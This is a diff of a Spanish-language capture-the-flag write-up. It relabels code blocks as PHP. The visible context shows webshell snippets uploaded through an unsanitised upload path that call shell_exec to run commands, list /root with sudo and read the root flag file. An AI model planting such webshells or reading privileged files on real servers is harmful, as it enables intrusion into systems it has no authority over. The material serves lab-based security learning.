@@ -28,7 +28,7 @@ Codifico esta web en PHP, como no se sanitiza la entrada el servidor es posible 
 se encuentra dentro de las rutas de la aplicación incluido el directorio de uploads. Así que a subir una _webshell_ toca.
 Poco a poco voy comprobando que la cosa funciona, prueba y error, determino la ruta completa hacia /root.
 
-```
+``` php
 <?php
 $output = shell_exec("pwd");
 echo $output;
@@ -49,7 +49,7 @@ echo $output;
 
 ```Salida commando www-data```
 
-``` 
+``` php
 <?php
 $output = shell_exec("sudo ls ../../../../root/");
 echo "Salida commando\n";
@@ -59,7 +59,7 @@ echo $output;
 ```Salida commando flag.txt```
 
 Codifico una última versión para capturar la banderita.
-```
+``` php
 <?php
 $output = shell_exec("sudo cat ../../../../root/flag.txt");
 echo "Salida commando\n";
